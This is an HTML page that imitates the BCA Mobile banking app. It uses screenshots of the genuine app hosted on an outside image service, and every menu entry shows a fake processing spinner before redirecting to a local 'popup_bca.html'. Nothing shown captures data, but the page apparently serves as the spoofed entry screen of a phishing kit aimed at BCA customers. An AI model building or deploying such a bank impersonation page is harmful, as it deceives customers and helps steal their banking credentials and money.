<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCA Mobile</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body{background:linear-gradient(180deg,#4a90e2 0%,#003b7a 100%);min-height:100vh;color:white;overflow-y:hidden}.menu-container{background:#fff;border-radius:5px;padding:.09rem;margin:20px;box-shadow:0 2px 5px rgba(0,0,0,.1);overflow-y:hidden}.menu-item{display:flex;align-items:center;padding:15px;border-bottom:1px solid #e0e0e0;cursor:pointer;text-decoration:none;color:#333;transition:background-color .2s;background:linear-gradient(180deg,#4a90e2 0%,#003b7a 100%);color:white;overflow-y:hidden}.menu-item:hover{background:linear-gradient(180deg,#5da0f2 0%,#004589 100%);color:white}.menu-item img{width:60px;margin-right:15px}.footer{width:100%;position:fixed;bottom:0;left:0;right:0;display:block;overflow-x:hidden}.bca-logo{padding:20px;text-align:center;border-radius:8px;display:inline-block}.bca{font-family:Arial,sans-serif;font-weight:bold;font-size:42px;color:white;letter-spacing:-2px}.mobile{font-family:Arial,sans-serif;font-size:24px;color:white;font-style:italic;margin-left:3px}.loading{display:none;text-align:center;margin-top:-365px}.loading-spinner{width:20px;height:20px;border:3px solid #f3f3f3;border-top:3px solid #003d79;border-radius:50%;animation:spin 1s linear infinite;display:inline-block}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.menu-container .menu-item img{border-radius:10px;width:70px}
       .btn-custom {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            width: 90%;
            margin: 10px 0;
            padding: 10px;
            border: none;
            border-radius: 10px;
            display: flex;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
            cursor: pointer;
            text-decoration: none;
            color: #333;
            transition: background-color 0.2s;
            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
            color: white;
            margin-left: 20px;
            font-weight: bold;
            overflow-y: hidden;
        }
  </style>
</head>
<body>
  <div class="bca-logo">
      <span class="bca">BCA</span><span class="mobile">mobile</span>
  </div>
  <div class="menu-container">
      <a href="#" class="menu-item btn" onclick="redirectWithDelay(event,'popup_bca.html')">
          <img src="https://i.ibb.co.com/J5MdZ87/Screenshot-20241112-173507-BCA-mobile.jpg" alt="m-BCA">
          <span>m-BCA</span>
      </a>
      <a href="#" class="menu-item btn" onclick="redirectWithDelay(event,'popup_bca.html')">
          <img src="https://i.ibb.co.com/HnmpBsy/Screenshot-20241112-170933-BCA-mobile.png" alt="KlikBCA">
          <span>KlikBCA</span>
      </a>
      <a href="#" class="menu-item btn" onclick="redirectWithDelay(event,'popup_bca.html')">
          <img src="https://i.ibb.co.com/7zLxK7h/Screenshot-20241112-170933-BCA-mobile.jpg" alt="Info BCA">
          <span>Info BCA</span>
      </a>
  </div>
  <button class="btn btn-custom d-block">Buka Rekening Baru</button>
  <button class="btn btn-custom d-block">Flazz</button>
  <img src="https://i.ibb.co.com/rdCN4rL/Screenshot-20241112-161148-BCA-mobile.png" alt="Footer" class="footer">
  
  <div class="loading">
      <div class="loading-spinner"></div>
      <p>Memproses...</p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
      function redirectWithDelay(e,u){e.preventDefault();const l=document.querySelector(".loading");l.style.display="block";const t=performance.now();fetch("https://www.google.com").then(()=>{const n=performance.now()-t;setTimeout(()=>{l.style.display="none",window.location.href=u},Math.min(5*n,3e3))}).catch(()=>{setTimeout(()=>{l.style.display="none",window.location.href=u},2e3)})}
  </script>
</body>
</html>
